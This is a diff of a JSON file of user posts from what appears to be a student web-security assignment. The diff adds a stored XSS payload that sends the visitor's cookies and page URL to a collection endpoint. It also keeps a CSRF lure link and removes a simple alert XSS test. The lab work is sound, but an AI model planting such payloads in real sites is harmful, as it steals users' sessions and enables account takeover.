@@ -1,6 +1,11 @@
 [
   {
     "username": "e",
+    "time": 1767457581948,
+    "squeak": "<script>fetch(\"https://localhost:9000/store/daniel\",{method:\"POST\",mode:\"cors\",headers:{Authorization:\"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkYW5pZWwiLCJpYXQiOjE3Njc0NTcwNTgsIm5iZiI6MTc2NzQ1NzA1OCwiZXhwIjoxNzY4MzIxMDU4LCJpc3MiOiJSRVNULXNlcnZpY2UifQ.W_7ogvhQpOliFnrujfPtzkZ94ICMlmNABxDJ7U5v3D8\",\"Content-Type\":\"application/json\"},body:JSON.stringify({cookie:document.cookie,page:location.href,t:new Date().toISOString().split(\".\")[0]})}).then(async r=>console.log(\"status\",r.status,\"data\",await r.json().catch(()=>null))).catch(console.error);</script>"
+  },
+  {
+    "username": "e",
     "time": 1759751215412,
     "squeak": "Click <a href='http://127.0.0.1:5500/assignment_3/CSRF_page.html'>here</a> to get the iPhobe X FREE!"
   },
@@ -8,10 +13,5 @@
     "username": "e",
     "time": 1759699795632,
     "squeak": "Hello world"
-  },
-  {
-    "username": "e",
-    "time": 1759699795642,
-    "squeak": "<script>alert('Owned');</script>"
   }
 ]
